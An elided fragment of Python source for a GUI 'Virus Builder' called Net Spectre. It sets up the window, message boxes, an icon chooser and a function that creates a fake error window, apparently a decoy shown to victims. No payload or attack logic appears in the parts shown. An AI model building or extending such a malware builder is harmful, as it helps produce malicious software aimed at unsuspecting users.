# Copyright (c) Net Spectre
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it as yours.
# FR:
...
try:
    ...
    builder = ctk.CTk()
    builder.title(f"Net Spectre {version_tool} - Virus Builder")
    builder.geometry("800x720")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    builder.iconbitmap(os.path.join(tool_path, "Img", "NetSpectre_logo.ico"))
    ...
    def ErrorLogs(message):
        ...
        messagebox.showerror(f"Net Spectre {version_tool} - Virus Builder", message)

    def InfoLogs(message):
        messagebox.showinfo(f"Net Spectre {version_tool} - Virus Builder", message)
    ...
    def ChooseIcon():
        ...
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                root.iconbitmap(os.path.join(tool_path, "Img", "NetSpectre_logo.ico"))
                root.withdraw()
    ...
    def CreateFakeErrorWindow():
        ...
        fake_error_window.title(f"Net Spectre {version_tool} - Fake Error")
